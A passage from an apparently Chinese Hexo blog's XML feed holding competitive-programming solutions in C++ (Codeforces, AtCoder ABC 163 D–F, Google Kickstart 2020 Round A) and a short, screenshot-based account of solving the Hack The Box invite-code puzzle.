punctuation">)</span><span class="token punctuation">,</span> <span class="token function">bfs</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> path3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">+</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> pref<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    ll ans <span class="token operator">=</span> <span class="token number">1e18</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>path1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>m<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> pref<span class="token punctuation">[</span>path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> pref<span class="token punctuation">[</span>path1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 163</title>
      <link href="/2020/04/20/AtCoder-ABC-163/"/>
      <url>/2020/04/20/AtCoder-ABC-163/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-163-D-F"><a href="#AtCoder-ABC-163-D-F" class="headerlink" title="AtCoder ABC 163 (D~F)"></a>AtCoder ABC 163 (D~F)</h1><h2 id="D-Sum-of-Large-Numbers"><a href="#D-Sum-of-Large-Numbers" class="headerlink" title="D.Sum of Large Numbers"></a>D.Sum of Large Numbers</h2><ul><li>题意：<br>给定两个数，$N,K$ ，有$N+1$个数，分别是$10^{100}+1,10^{100}+2….,10^{100}+N$,问至少取K个数，取得的数字之和不同的个数是多少。</li><li>题解:<br>可以发现，取不同个数的数字是不同的，所以只要知道在${0,1,2,…,N} , N+1$个数中,取x个数，这x个数表示的范围是多少。可以发现$1+2+…+x \leq sum\leq(n-x)+(n-x+1)+…+n$所以，知道了这些，就可以枚举$k$到$n$，就能得出答案了。<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    ll lsum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> rsum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lsum <span class="token operator">+=</span> i<span class="token punctuation">;</span>        rsum <span class="token operator">+=</span> n  <span class="token operator">-</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> rsum <span class="token operator">-</span> lsum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lsum <span class="token operator">+=</span> i<span class="token punctuation">,</span> rsum <span class="token operator">+=</span> n <span class="token operator">-</span> i<span class="token punctuation">;</span>      <span class="token comment">//  cout &lt;&lt; lsum &lt;&lt; " " &lt;&lt; rsum &lt;&lt; " " &lt;&lt; rsum - lsum &lt;&lt; "\n";</span>        sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> rsum <span class="token operator">-</span> lsum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="E-Active-Infants"><a href="#E-Active-Infants" class="headerlink" title="E. Active Infants"></a>E. Active Infants</h2><ul><li>题意：<br>给定$N$个数，可以进行一次任意调序。定义一个$sum$，表示$\sum<em>{i=1}^{n} a[i]*abs(pos</em>{change})$，问求得的$sum$最大是多少？</li><li>题解：<br>可以发现，使得当前值最大的该变量就是将当前值移到数组首端或者末端。就可以很自然而然的想到要用dp求解。<br>$dp[l][r]$ 表示在$l~r$这个范围还没有被占用的最大$sum$值。<br>可以得到状态转移方程:<br>$dp[l][r] = max(dp[l][r], dp[l][r + 1] + a[i]<em> abs(pos - (r+1));$<br>$dp[l][r] = max(dp[l][r], dp[l-1][r] + a[i]</em> abs(pos - (l-1));$</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> ll<span class="token operator">>></span> <span class="token function">vec</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">=</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> l <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> N <span class="token operator">-</span> i <span class="token operator">+</span> j<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> N<span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">-</span> r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> vec<span class="token punctuation">[</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="F-path-pass-i"><a href="#F-path-pass-i" class="headerlink" title="F. path pass i"></a>F. path pass i</h2><ul><li><p>题意：<br>给定一棵树，有$N$个节点，每个节点有一种颜色，问包含每种颜色的简单路径个数是多少。</p></li><li><p>题解：<br>正的计数很难做，可以知道经过所有节点的简单路径总个数是$N*(N+1)/2$ 。那么只要求出简单路径上没有该颜色的个数，就可以求出答案。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">cal</span><span class="token punctuation">(</span>ll n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//图</span><span class="token keyword">int</span> c<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//颜色</span><span class="token keyword">int</span> sz<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> sum<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//sz[i]表示以i为根节点的子节点个数 ,  sum[i] 表示 以颜色为 i 的所有节点个数</span>ll ans<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//答案</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span><span class="token keyword">int</span> fa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> in <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v <span class="token operator">==</span> fa<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> front <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> back <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> front<span class="token punctuation">;</span>        ans<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>sz<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>back<span class="token punctuation">)</span><span class="token punctuation">;</span>        sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+=</span> sz<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> in<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a <span class="token operator">>></span> b<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ans<span class="token punctuation">[</span>N<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">(</span>N <span class="token operator">-</span> sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token comment">// cout &lt;&lt; c[i]&lt;&lt;" "&lt;&lt;sum[i] &lt;&lt; "\n";</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box 邀请码获取</title>
      <link href="/2020/03/24/Hack-The-Box-%E9%82%80%E8%AF%B7%E7%A0%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2020/03/24/Hack-The-Box-%E9%82%80%E8%AF%B7%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>学长发了一个链接，点进去看了一下好像有点意思。正好之前单推vtuber（DD）的时候学了点相关知识。就玩一下。</p><p>url : <a href="https://www.hackthebox.eu/invite">https://www.hackthebox.eu/invite</a></p><h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h1><h2 id="1-碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。"><a href="#1-碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。" class="headerlink" title="(1)  碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。"></a>(1)  碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。</h2><p><img src="1.png" alt=""></p><h2 id="2-进入网站之后发现一个函数，在控制台命令里面试一下"><a href="#2-进入网站之后发现一个函数，在控制台命令里面试一下" class="headerlink" title="(2) 进入网站之后发现一个函数，在控制台命令里面试一下"></a>(2) 进入网站之后发现一个函数，在控制台命令里面试一下</h2><p><img src="2.png" alt=""></p><h2 id="3-试一下果然试出了端倪"><a href="#3-试一下果然试出了端倪" class="headerlink" title="(3)试一下果然试出了端倪"></a>(3)试一下果然试出了端倪</h2><p><img src="3.png" alt=""></p><h2 id="4-发现是构建post请求的，那直接用curl"><a href="#4-发现是构建post请求的，那直接用curl" class="headerlink" title="(4)发现是构建post请求的，那直接用curl"></a>(4)发现是构建post请求的，那直接用curl</h2><p><img src="4.png" alt=""></p><h2 id="5-发现base64解码，这里我多试了一下发现有其他解码方式"><a href="#5-发现base64解码，这里我多试了一下发现有其他解码方式" class="headerlink" title="(5) 发现base64解码，这里我多试了一下发现有其他解码方式"></a>(5) 发现base64解码，这里我多试了一下发现有其他解码方式</h2><p><img src="5.png" alt="image"></p><h2 id="6-解码完成之后发现是这个"><a href="#6-解码完成之后发现是这个" class="headerlink" title="(6) 解码完成之后发现是这个"></a>(6) 解码完成之后发现是这个</h2><p><img src="6.png" alt=""></p><h2 id="7-那就再构建一次post"><a href="#7-那就再构建一次post" class="headerlink" title="(7) 那就再构建一次post"></a>(7) 那就再构建一次post</h2><p><img src="7.png" alt=""></p><h2 id="8-那就再解码一次，这次终于找到了"><a href="#8-那就再解码一次，这次终于找到了" class="headerlink" title="(8) 那就再解码一次，这次终于找到了"></a>(8) 那就再解码一次，这次终于找到了</h2><p><img src="8.png" alt=""></p><h1 id="3-心得"><a href="#3-心得" class="headerlink" title="3. 心得"></a>3. 心得</h1><p>寻找线索的时候要冷静。 /狗头</p><p><img src="9.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Kickstart 2020 Round A</title>
      <link href="/2020/03/22/Google-Kickstart-2020-Round-A/"/>
      <url>/2020/03/22/Google-Kickstart-2020-Round-A/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="A-Allocation"><a href="#A-Allocation" class="headerlink" title="A. Allocation"></a>A. Allocation</h1><h2 id="题意：-给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。"><a href="#题意：-给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。" class="headerlink" title="题意： 给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。"></a>题意： 给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。</h2><h2 id="题解：-排序，贪心。"><a href="#题解：-排序，贪心。" class="headerlink" title="题解： 排序，贪心。"></a>题解： 排序，贪心。</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">,</span> x<span class="token punctuation">,</span> B<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> B<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> x<span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>B<span class="token operator">-</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>            ans<span class="token operator">++</span><span class="token punctuation">,</span> B <span class="token operator">-=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//cin >> T;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="B-Plates"><a href="#B-Plates" class="headerlink" title="B. Plates"></a>B. Plates</h1><h2 id="题意-n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大"><a 